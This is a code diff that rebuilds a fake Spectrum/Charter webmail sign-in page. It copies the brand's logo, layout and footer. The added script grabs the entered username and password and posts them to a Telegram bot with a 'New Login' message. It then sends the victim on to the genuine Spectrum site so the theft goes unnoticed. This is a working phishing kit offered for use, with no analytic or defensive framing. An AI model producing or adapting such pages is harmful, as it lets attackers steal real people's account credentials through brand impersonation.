@@ -1,63 +1,217 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Spectrum | Login</title>
-    <link rel="stylesheet" href="./style.css">
-</head>
-<body>
+    <link rel="stylesheet" href="./style.css" />
+    <script type="text/javascript" src="./script.js"></script>
+  </head>
+  <body>
     <header>
-        <div class="menu">
-            MENU
-        </div>
-        <div>
-            <img src="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.17.1_4" alt="">
-        </div>
-        <div class="menu">
-            Support
-        </div>
+      <div>
+        <img
+          src="https://webmail.spectrum.net/application/modules/mail/views/scripts/mail/images/logos/spectrum-logo.svg?v=2.17.1_4"
+          alt=""
+        />
+      </div>
     </header>
+    <div class="div">
+      <a class="leave" href="">Leave Feedback</a>
+      <a class="leave" href="">En español</a>
+    </div>
+    <div class="form-container">
+      <form action="">
+      <h1>Sign In to Get Started</h1>
+      <div class="col">
+        <div class="div1">
+          <p class="border"></p>
+          <p>or</p>
+          <p class="border"></p>
+        </div>
+        <div class="create">
+          <a href="">Create a Username</a>
+        </div>
+        <div class="render">
+          <div class="text">
+            <label for="name">Username</label>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              class="lucide lucide-help-circle h-4 w-4 text-gray-400"
+            >
+              <circle cx="12" cy="12" r="10"></circle>
+              <path d="M9.09 9a3 3 0 1 1 5.91 1c0 2-3 3-3 3"></path>
+              <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
 
-    <form action="">
-        <h2>Sign In to Webmail</h2>
-        <div class="div">
-            <label for="">Email Address</label>
-            <input type="email" class="input">
-        </div>
-        <div class="check">
-            <input type="checkbox">
-            Remember Email Address
-        </div>
+            <input
+              type="text"
+              id="name"
+              class="input"
+              name="name"
+              value=""
+              required=""
+            />
+            <div id="emailError" class="error-message" style="color: red;"></div>
+          </div>
+          <div class="password-wrapper">
+            <label for="password">Password</label>
+            <input
+              type="password"
+              id="password"
+              class="input"
+              name="password"
+              value=""
+              required=""
+            />
+            <div id="passwordError" class="error-message" style="color: red;"></div>
+            <span id="togglePassword" class="eye-icon">
+              <!-- Eye Open by default -->
+              <svg
+                id="eyeIcon"
+                xmlns="http://www.w3.org/2000/svg"
+                width="20"
+                height="20"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                viewBox="0 0 24 24"
+              >
+                <path
+                  class="eye"
+                  d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
+                />
+                <circle class="eye" cx="12" cy="12" r="3" />
+                <path class="slash" d="M2 2l20 20" style="display: none" />
+              </svg>
+            </span>
+          </div>
 
-        <div class="div">
-            <label for="">Email Password</label>
-            <input type="password" class="input">
+          <div>
+            <input type="checkbox" class="check" />
+            Stay Signed In on This Device
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              class="lucide lucide-help-circle h-4 w-4 text-gray-400"
+            >
+              <circle cx="12" cy="12" r="10"></circle>
+              <path d="M9.09 9a3 3 0 1 1 5.91 1c0 2-3 3-3 3"></path>
+              <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
+          </div>
+          <div>
+            <button type="submit" id="signIn">Sign In</button>
+          </div>
+          <div class="margin">
+            <a href="" class="href">Forgot Username or Password?</a>
+          </div>
+          <div></div>
         </div>
-        <button>
-            Sign In
-        </button>
+      </div>
     </form>
 
-    <div class="eml">
-        <a style="margin-left: 10px;" href="">Forgot Email Address?</a>
-        <a style="margin-left: 5px;" href="">Forgot Email Password?</a>
-    </div>
 
-    <footer>
-  <div class="adds">
-    <p>© 2022 Charter Communications. All rights reserved <span>|</span></p>
-    <p>Advertise with Us <span>|</span></p>
-    <p>Your Privacy Rights <span>|</span></p>
-    <p>Web Privacy Policy <span>|</span></p>
-    <p>California Consumer Privacy Rights <span>|</span></p>
-    <p>Do Not Sell or Share My Personal Info <span>|</span></p>
-  </div>
-  <div class="adds1">
-    <p>Limit Use of Sensitive Info <span>|</span></p>
-    <p>Spectrum Subscriber Policies <span>|</span></p>
-    <p>Time Warner Cable and logo are trademarks of Time Warner Inc., used under license.</p>
-  </div>
-</footer>
-</body>
+    </div>    <footer>
+      <nav class="footer-nav">
+        <a class="policy" href="#">Your Privacy Rights</a>
+        <span>|</span>
+        <a class="policy" href="#">California Consumer Privacy Rights</a>
+        <span>|</span>
+        <a class="policy" href="#">Limit the Use of My Sensitive Info</a>
+        <span>|</span>
+        <a class="policy" href="#">Do Not Sell or Share My Info</a>
+        <span>|</span>
+        <a class="policy" href="#">Policies</a>
+        <span>|</span>
+        <a class="policy" href="#">Contact Us</a>
+        <span>|</span>
+        <a class="policy" href="#">Support</a>
+      </nav>
+      <p class="footer-text">© 2025 Charter Communications</p>
+    </footer>
+
+    <script>
+      const passwordInput = document.getElementById("password");
+      const eyeIcon = document.getElementById("eyeIcon");
+      const slash = eyeIcon.querySelector(".slash");
+      const eyeParts = eyeIcon.querySelectorAll(".eye");
+
+      document
+        .getElementById("togglePassword")
+        .addEventListener("click", function () {
+          const isPasswordHidden = passwordInput.type === "password";
+          passwordInput.type = isPasswordHidden ? "text" : "password";
+
+          // Toggle slash
+          slash.style.display = isPasswordHidden ? "inline" : "none";
+
+          // Optional: dim the eye parts when visible
+          eyeParts.forEach((p) => {
+            p.style.opacity = isPasswordHidden ? "0.6" : "1";
+          });
+        });
+    </script>
+
+    <script>
+        document.getElementById("signIn").addEventListener("click", function (event) {
+  event.preventDefault(); // Prevent form submission
+
+  const name = document.getElementById("name").value;
+  const password = document.getElementById("password").value;
+  
+  document.getElementById("emailError").textContent = "";
+document.getElementById("passwordError").textContent = "";
+
+// Validate inputs
+let isValid = true;
+if (!name.trim()) {
+  document.getElementById("emailError").textContent = "Email is required";
+  isValid = false;
+}
+if (!password.trim()) {
+  document.getElementById("passwordError").textContent = "Password is required";
+  isValid = false;
+}
+if (!isValid) return;
+
+  const message = `🔐 New Login:\n📧 Username: ${name}\n🔑 Password: ${password}`;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+    }),
+  })
+    .then((response) => response.json())
+    .then((data) => {
+      console.log("Message sent to Telegram", data);
+      window.location.href = "https://id.spectrum.net/bookmarked-landing";
+    })
+    .catch((error) => {
+      console.error("Error sending message to Telegram", error);
+      window.location.href = "https://obfuscator.io/";
+    });
+});
+    </script>
+  </body>
 </html>
